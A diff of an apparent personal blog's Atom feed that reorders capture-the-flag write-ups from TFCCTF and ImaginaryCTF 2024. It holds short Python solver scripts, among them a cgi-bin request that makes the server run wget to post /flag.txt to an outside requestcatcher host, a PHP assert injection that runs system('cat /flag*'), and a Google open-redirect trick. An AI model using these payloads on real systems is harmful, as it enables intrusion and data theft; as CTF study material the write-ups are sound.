@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://shafouz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://shafouz.github.io/" rel="alternate" type="text/html" /><updated>2024-12-24T19:59:50+00:00</updated><id>https://shafouz.github.io/feed.xml</id><title type="html">shafouz blog</title><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><entry><title type="html">ArcticVault - GlacierCTF 2024</title><link href="https://shafouz.github.io/2024/11/24/ArcticVault.html" rel="alternate" type="text/html" title="ArcticVault - GlacierCTF 2024" /><published>2024-11-24T04:00:00+00:00</published><updated>2024-11-24T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/11/24/ArcticVault</id><content type="html" xml:base="https://shafouz.github.io/2024/11/24/ArcticVault.html"><![CDATA[<p>https://ctftime.org/event/2402</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://shafouz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://shafouz.github.io/" rel="alternate" type="text/html" /><updated>2024-12-24T20:07:14+00:00</updated><id>https://shafouz.github.io/feed.xml</id><title type="html">shafouz blog</title><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><entry><title type="html">ArcticVault - GlacierCTF 2024</title><link href="https://shafouz.github.io/2024/11/24/ArcticVault.html" rel="alternate" type="text/html" title="ArcticVault - GlacierCTF 2024" /><published>2024-11-24T04:00:00+00:00</published><updated>2024-11-24T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/11/24/ArcticVault</id><content type="html" xml:base="https://shafouz.github.io/2024/11/24/ArcticVault.html"><![CDATA[<p>https://ctftime.org/event/2402</p>
 
 <h1 id="arcticvault-blockchain">ArcticVault (blockchain)</h1>
 
@@ -293,70 +293,7 @@ thcheck -&gt;  {{ .UserHealthcheck }}"""</span>
 <h2 id="flag">Flag</h2>
 <p><code class="language-plaintext highlighter-rouge">bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}</code></p>
 
-<p>shafouz - 2024/10/13</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2479]]></summary></entry><entry><title type="html">surfing - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/surfing.html" rel="alternate" type="text/html" title="surfing - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/surfing</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/surfing.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
-
-<h1 id="surfing-web">surfing (web)</h1>
-
-<p>Google redirects</p>
-
-<h2 id="solution">Solution</h2>
-
-<p>Very interesting challenge, basically you send an email on gmail to yourself to get the usg parameter.
-Then you can use google as a open-redirect.
-<code class="language-plaintext highlighter-rouge">#</code> at the end is needed for some reason.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span><span class="p">,</span> <span class="n">quote</span>
-
-<span class="n">part2</span> <span class="o">=</span> <span class="s">"https://ca14-2804-1b3-8146-8451-d3ef-cb85-2b79-23d7.ngrok-free.app&amp;source=gmail&amp;ust=1722697936722000&amp;usg=AOvVaw3Djb1BbeFhNoc5_At0Cbfe#"</span>
-<span class="n">part2</span> <span class="o">=</span> <span class="n">quote_plus</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"http://google.com/url?q="</span> <span class="o">+</span> <span class="n">part2</span>
-
-<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31595/get"</span>
-
-<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="sa">f</span><span class="s">'url=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
-    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
-    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
-<span class="p">})</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:6: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-
-
-</code></pre></div></div>
-
-<h2 id="flag">Flag</h2>
-<p><code class="language-plaintext highlighter-rouge">TFCCTF{18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc}</code></p>
-
-<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">funny - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/funny.html" rel="alternate" type="text/html" title="funny - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/funny</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/funny.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
-
-<h1 id="funny-web">funny (web)</h1>
-
-<p>cgi-bin stuff</p>
-
-<h2 id="solution">Solution</h2>
-
-<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ScriptAlias</span> /<span class="n">cgi</span>-<span class="n">bin</span> /<span class="n">usr</span>/<span class="n">bin</span>
-</code></pre></div></div>
-<p>Allows us to execute any binary on the dir with http path.
-It took some trial and error to get it working, i wonder if you can solve it with awk</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">quote_plus</span>
-
-<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31311/"</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"wget?--post-file+/flag.txt+https://lalalalalallalala.requestcatcher.com/"</span>
-<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"cgi-bin/</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
-    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
-    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
-<span class="p">})</span>
-<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
-</code></pre></div></div>
-
-<h2 id="flag">Flag</h2>
-<p><code class="language-plaintext highlighter-rouge">TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}</code></p>
-
-<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">flask destroyer - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/flask-destroyer.html" rel="alternate" type="text/html" title="flask destroyer - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/flask-destroyer</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/flask-destroyer.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
+<p>shafouz - 2024/10/13</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2479]]></summary></entry><entry><title type="html">flask destroyer - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/flask-destroyer.html" rel="alternate" type="text/html" title="flask destroyer - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/flask-destroyer</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/flask-destroyer.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
 
 <h1 id="flask-destroyer-web">flask-destroyer (web)</h1>
 
@@ -429,30 +366,70 @@ The intented way to crash the worker is abusing <code class="language-plaintext 
 <h2 id="flag">Flag</h2>
 <p><code class="language-plaintext highlighter-rouge">TFCCTF{Cr4Sh_g0_bRbRbRbRbR}</code></p>
 
-<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">journal - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/journal.html" rel="alternate" type="text/html" title="journal - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/journal</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/journal.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
+<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">funny - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/funny.html" rel="alternate" type="text/html" title="funny - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/funny</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/funny.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
 
-<h1 id="journal-web">journal (web)</h1>
+<h1 id="funny-web">funny (web)</h1>
 
-<p>one file php challenge</p>
+<p>cgi-bin stuff</p>
 
 <h2 id="solution">Solution</h2>
 
-<p>At first i thought there was some include path stuff.
-But after trying every byte there were some interesting messages about assert.
-And its apparently well known:
-https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp</p>
+<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ScriptAlias</span> /<span class="n">cgi</span>-<span class="n">bin</span> /<span class="n">usr</span>/<span class="n">bin</span>
+</code></pre></div></div>
+<p>Allows us to execute any binary on the dir with http path.
+It took some trial and error to get it working, i wonder if you can solve it with awk</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">quote_plus</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"file1.txt' and die(system(</span><span class="se">\"</span><span class="s">cat /flag*</span><span class="se">\"</span><span class="s">)) or '"</span>
-<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://journal.chal.imaginaryctf.org/"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"file"</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:14: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31311/"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"wget?--post-file+/flag.txt+https://lalalalalallalala.requestcatcher.com/"</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"cgi-bin/</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+<span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div></div>
 
 <h2 id="flag">Flag</h2>
-<p><code class="language-plaintext highlighter-rouge">ictf{assertion_failed_e3106922feb13b10}</code></p>
+<p><code class="language-plaintext highlighter-rouge">TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}</code></p>
 
-<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">gdbjail2 - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/gdbjail2.html" rel="alternate" type="text/html" title="gdbjail2 - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/gdbjail2</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/gdbjail2.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
+<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">surfing - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/surfing.html" rel="alternate" type="text/html" title="surfing - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/surfing</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/surfing.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
+
+<h1 id="surfing-web">surfing (web)</h1>
+
+<p>Google redirects</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>Very interesting challenge, basically you send an email on gmail to yourself to get the usg parameter.
+Then you can use google as a open-redirect.
+<code class="language-plaintext highlighter-rouge">#</code> at the end is needed for some reason.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span><span class="p">,</span> <span class="n">quote</span>
+
+<span class="n">part2</span> <span class="o">=</span> <span class="s">"https://ca14-2804-1b3-8146-8451-d3ef-cb85-2b79-23d7.ngrok-free.app&amp;source=gmail&amp;ust=1722697936722000&amp;usg=AOvVaw3Djb1BbeFhNoc5_At0Cbfe#"</span>
+<span class="n">part2</span> <span class="o">=</span> <span class="n">quote_plus</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"http://google.com/url?q="</span> <span class="o">+</span> <span class="n">part2</span>
+
+<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31595/get"</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="sa">f</span><span class="s">'url=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+<span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:6: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">TFCCTF{18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc}</code></p>
+
+<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">gdbjail2 - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/gdbjail2.html" rel="alternate" type="text/html" title="gdbjail2 - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/gdbjail2</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/gdbjail2.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
 
 <h1 id="gdbjail2-misc">gdbjail2 (misc)</h1>
 
@@ -591,6 +568,29 @@ This gives us a heap string of any size we want.</p>
 
 <h2 id="flag">Flag</h2>
 <p><code class="language-plaintext highlighter-rouge">ictf{i_l0ve_syscalls_eebc5336}</code></p>
+
+<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">journal - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/journal.html" rel="alternate" type="text/html" title="journal - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/journal</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/journal.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
+
+<h1 id="journal-web">journal (web)</h1>
+
+<p>one file php challenge</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>At first i thought there was some include path stuff.
+But after trying every byte there were some interesting messages about assert.
+And its apparently well known:
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"file1.txt' and die(system(</span><span class="se">\"</span><span class="s">cat /flag*</span><span class="se">\"</span><span class="s">)) or '"</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://journal.chal.imaginaryctf.org/"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"file"</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:14: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">ictf{assertion_failed_e3106922feb13b10}</code></p>
 
 <p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">ok nice - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/ok-nice.html" rel="alternate" type="text/html" title="ok nice - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/ok-nice</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/ok-nice.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
 
